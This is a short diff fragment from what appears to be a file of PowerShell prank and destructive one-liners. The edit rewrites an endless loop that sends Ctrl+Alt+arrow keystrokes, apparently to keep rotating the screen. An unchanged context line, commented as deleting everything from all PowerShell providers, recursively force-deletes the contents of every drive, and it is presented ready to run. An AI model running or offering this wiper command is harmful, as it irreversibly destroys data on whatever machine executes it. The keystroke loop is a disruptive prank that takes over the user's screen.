@@ -147,7 +147,7 @@ while ($true){
 }
 
 #jw jako oneliner
-while(1){@('^%{LEFT}', '^%{DOWN}', '^%{RIGHT}', '^%{UP}') | % {[System.Windows.Forms.SendKeys]::SendWait($_)}}
+for(){@('^%{LEFT}', '^%{DOWN}', '^%{RIGHT}', '^%{UP}') | % {[System.Windows.Forms.SendKeys]::SendWait($_)}}
     
 #deliting all from all psproviders
 (Get-PSProvider | select -exp Drives | select -exp name) | % {ls $_":\" -r | ri -fo}
